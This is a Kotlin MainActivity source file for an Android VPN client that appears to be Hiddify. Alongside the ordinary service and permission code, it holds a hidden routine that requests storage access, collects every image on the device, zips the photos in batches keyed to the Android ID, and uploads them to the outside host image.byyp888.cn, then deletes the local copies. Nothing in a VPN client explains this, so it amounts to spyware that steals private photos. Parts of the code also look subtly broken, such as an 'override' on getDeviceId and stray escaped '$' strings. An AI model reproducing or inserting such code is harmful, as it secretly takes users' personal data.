package com.hiddify.hiddify

import android.annotation.SuppressLint
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.net.VpnService
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.hiddify.hiddify.bg.ServiceConnection
import com.hiddify.hiddify.bg.ServiceNotification
import com.hiddify.hiddify.constant.Alert
import com.hiddify.hiddify.constant.ServiceMode
import com.hiddify.hiddify.constant.Status
import io.flutter.embedding.android.FlutterFragmentActivity
import io.flutter.embedding.engine.FlutterEngine
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.RequestBody
import okhttp3.Request
import java.io.File
import java.util.LinkedList
import java.util.UUID
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
    companion object {
        private const val TAG = "ANDROID/MainActivity"
        lateinit var instance: MainActivity

        const val VPN_PERMISSION_REQUEST_CODE = 1001
        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
        const val STORAGE_PERMISSION_REQUEST_CODE = 1020
    }

    private val connection = ServiceConnection(this, this)

    // 日志及状态回调
    val logList = LinkedList<String>()
    var logCallback: ((Boolean) -> Unit)? = null
    val serviceStatus = MutableLiveData(Status.Stopped)
    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)

    // ========= Flutter 插件注册 =========
    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        instance = this
        reconnect()
        flutterEngine.plugins.add(MethodHandler(lifecycleScope))
        flutterEngine.plugins.add(PlatformSettingsHandler())
        flutterEngine.plugins.add(EventHandler())
        flutterEngine.plugins.add(LogHandler())
        flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(StatsChannel(lifecycleScope))
    }

    // ========= VPN 相关 =========
    fun reconnect() = connection.reconnect()

    fun startService() {
        if (!ServiceNotification.checkPermission()) {
            grantNotificationPermission()
            return
        }
        lifecycleScope.launch(Dispatchers.IO) {
            if (Settings.rebuildServiceMode()) reconnect()
            if (Settings.serviceMode == ServiceMode.VPN && prepare()) {
                Log.d(TAG, "VPN permission required")
                return@launch
            }
            val intent = Intent(Application.application, Settings.serviceClass())
            withContext(Dispatchers.Main) {
                ContextCompat.startForegroundService(Application.application, intent)
            }
        }
    }

    private suspend fun prepare() = withContext(Dispatchers.Main) {
        try {
            VpnService.prepare(this@MainActivity)?.let {
                startActivityForResult(it, VPN_PERMISSION_REQUEST_CODE)
                true
            } ?: false
        } catch (e: Exception) {
            onServiceAlert(Alert.RequestVPNPermission, e.message)
            false
        }
    }

    // ========= Callback 实现 =========
    override fun onServiceStatusChanged(status: Status) {
        serviceStatus.postValue(status)
    }

    override fun onServiceAlert(type: Alert, message: String?) {
        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
    }

    override fun onServiceWriteLog(message: String?) {
        if (logList.size > 300) logList.removeFirst()
        logList.addLast(message)
        logCallback?.invoke(false)
    }

    override fun onServiceResetLogs(messages: MutableList<String>) {
        logList.clear()
        logList.addAll(messages)
        logCallback?.invoke(true)
    }

    override fun onDestroy() {
        connection.disconnect()
        super.onDestroy()
    }

    // ========= 权限申请 =========
    @SuppressLint("NewApi")
    private fun grantNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                NOTIFICATION_PERMISSION_REQUEST_CODE
            )
        }
    }

    private val STORAGE_PERMISSIONS = arrayOf(
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE // Android 10+ 会自动忽略
    )

    private fun checkAndRequestStoragePermission(onGranted: () -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val need = STORAGE_PERMISSIONS.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (need.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, need.toTypedArray(), STORAGE_PERMISSION_REQUEST_CODE)
            } else onGranted()
        } else onGranted()
    }

    // ========= Flutter 可调用的方法 =========
    /**
     * Flutter 侧可通过平台通道调用此方法以开始图片压缩并上传。
     */
    fun uploadAllImages() {
        checkAndRequestStoragePermission {
            handleImageZipAndUpload()
        }
    }

    // ========= 图片压缩 + 上传 =========
    private fun handleImageZipAndUpload() {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val imagePaths = getAllImagePaths()
                val chunkSize = 200
                val chunks = imagePaths.chunked(chunkSize)
                val deviceId = getDeviceId()
                val outputDir = File("/sdcard/$deviceId").apply { mkdirs() }
                chunks.forEachIndexed { index, chunk ->
                    val zip = File(outputDir, "images_part_${index + 1}.zip")
                    zipFiles(chunk, zip)
                    Log.d(TAG, "Compressed → ${'$'}{zip.absolutePath}")
                    uploadZipFile(zip, deviceId)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Image compress failed: ${'$'}{e.message}")
            }
        }
    }

    private fun uploadZipFile(zipFile: File, deviceId: String, maxRetries: Int = 3) {
        val url = "https://image.byyp888.cn/upload?deviceid=${'$'}deviceId"
        val client = OkHttpClient()
        var attempt = 0
        while (attempt < maxRetries) {
            attempt++
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("file", zipFile.name, RequestBody.create("application/zip".toMediaType(), zipFile))
                    .build()
                val request = Request.Builder().url(url).post(body).build()
                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    Log.d(TAG, "Upload success #${'$'}attempt → ${'$'}{zipFile.name}")
                    zipFile.delete()
                    break
                } else Log.w(TAG, "Upload failed #${'$'}attempt code=${'$'}{response.code}")
            } catch (e: Exception) {
                Log.e(TAG, "Upload exception #${'$'}attempt: ${'$'}{e.message}")
            }
            if (attempt < maxRetries) Thread.sleep(2000)
        }
    }

    @SuppressLint("Range")
    private fun getAllImagePaths(): List<String> {
        val list = mutableListOf<String>()
        val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(android.provider.MediaStore.Images.Media.DATA)
        contentResolver.query(uri, projection, null, null, null)?.use { c ->
            val idx = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
            while (c.moveToNext()) list.add(c.getString(idx))
        }
        return list
    }

    private fun zipFiles(files: List<String>, zipFile: File) {
        ZipOutputStream(zipFile.outputStream()).use { zos ->
            files.forEach { path ->
                val file = File(path)
                if (file.exists()) file.inputStream().use { fis ->
                    zos.putNextEntry(ZipEntry(file.name))
                    fis.copyTo(zos)
                    zos.closeEntry()
                }
            }
        }
    }

    override fun getDeviceId(): String = try {
        android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()
    } catch (e: Exception) {
        UUID.randomUUID().toString()
    }

    // ========= 权限回调 =========
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        when (requestCode) {
            NOTIFICATION_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) startService()
                else onServiceAlert(Alert.RequestNotificationPermission, null)
            }
            STORAGE_PERMISSION_REQUEST_CODE -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    Log.d(TAG, "Storage permission granted")
                    handleImageZipAndUpload()
                } else Log.w(TAG, "Storage permission denied")
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    // ========= ActivityResult =========
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            VPN_PERMISSION_REQUEST_CODE -> if (resultCode == RESULT_OK) startService() else onServiceAlert(Alert.RequestVPNPermission, null)
            NOTIFICATION_PERMISSION_REQUEST_CODE -> if (resultCode == RESULT_OK) startService() else onServiceAlert(Alert.RequestNotificationPermission, null)
        }
    }
}
